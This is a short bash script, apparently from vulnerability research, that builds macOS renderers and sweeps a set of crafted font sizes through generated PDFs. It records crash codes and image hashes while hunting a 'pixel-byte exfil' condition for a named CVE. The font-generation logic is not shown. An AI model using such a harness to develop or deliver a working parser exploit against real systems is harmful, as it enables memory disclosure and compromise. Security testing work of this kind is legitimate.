#!/bin/bash
# M4c: canvas-hit hunt — L in the untested rc=0 gap [1024, 8000], pixel-byte exfil
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
clang -O2 -g -o render2 render2.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYEOF'
import sys, os
sys.path.insert(0, os.path.abspath('.'))
from gen_k2 import build_font
for L in (1024, 1536, 2048, 2560, 3072, 3584, 4096, 4608, 5120, 6144, 7168, 7680):
    build_font(f"k2_c{L}.ttf", L)
print("gen done: 12")
PYEOF
for L in 1024 1536 2048 2560 3072 3584 4096 4608 5120 6144 7168 7680; do
  ./venv/bin/python gen_pdf.py k2_c${L}.pdf k2_c${L}.ttf
  ./render k2_c${L}.pdf >/dev/null 2>&1; RC=$?
  ./render2 k2_c${L}.pdf cpng_${L}.png >/dev/null 2>&1; RC2=$?
  MD5=$(md5 -q cpng_${L}.png 2>/dev/null || echo nopng)
  echo "canvas L=$L rc=$RC rc2=$RC2 md5=$MD5" >> canvas_map.txt
done
cat canvas_map.txt
cd ../..
mkdir -p findings && cp detonation/cve-2026-86950/{canvas_map.txt,cpng_*.png} findings/ 2>/dev/null
ls findings/ | wc -l
